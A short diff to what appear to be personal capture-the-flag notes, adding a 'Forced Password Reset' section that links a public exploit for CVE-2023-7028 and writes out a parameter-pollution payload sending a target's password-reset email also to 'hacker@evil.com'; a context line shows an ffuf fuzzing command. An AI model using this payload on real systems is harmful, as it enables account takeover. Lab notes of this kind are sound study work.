@@ -67,3 +67,14 @@ ffuf -u https://vdooaly3.eu1.ctfio.com/api-token-leak/api/FUZZ -w /usr/share/sec
 
 ![[Pasted image 20241217133540.png]]
 
+# Forced Password Reset
+
+Add email field, 
+![[Pasted image 20241217134424.png]]
+
+https://github.com/Vozec/CVE-2023-7028
+
+
+```
+user[email][]=my.target@example.com&user[email][]=hacker@evil.com
+```
